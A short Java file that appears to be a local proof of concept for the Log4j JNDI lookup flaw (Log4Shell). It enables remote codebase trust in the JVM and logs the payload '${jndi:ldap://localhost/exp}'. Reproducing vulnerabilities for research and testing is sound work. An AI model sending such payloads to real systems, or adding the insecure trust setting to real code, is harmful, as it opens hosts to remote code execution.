package org.example;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

/**
 * Hello world!
 *
 */
public class App 
{
    private static Logger log = LogManager.getLogger();
    public static void main( String[] args )
    {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true"); // for jdk > 8u191
        String payload = "${jndi:ldap://localhost/exp}";
        log.error(payload);
    }
}
